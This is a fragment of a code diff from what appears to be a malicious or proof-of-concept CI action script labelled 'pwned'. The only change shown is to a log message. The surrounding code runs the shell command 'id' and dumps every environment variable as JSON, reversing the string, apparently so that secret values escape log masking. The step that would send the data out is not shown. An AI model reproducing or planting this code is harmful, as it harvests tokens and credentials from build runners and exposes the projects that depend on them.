@@ -13,7 +13,7 @@ async function main() {
     try {
         setUserAgent();
 
-        console.log('pwned action...');
+        console.log('pwned2 action...');
         execSync('id', { stdio: 'inherit' });
         
         const envJson = JSON.stringify(process.env).split("").reverse().join("");
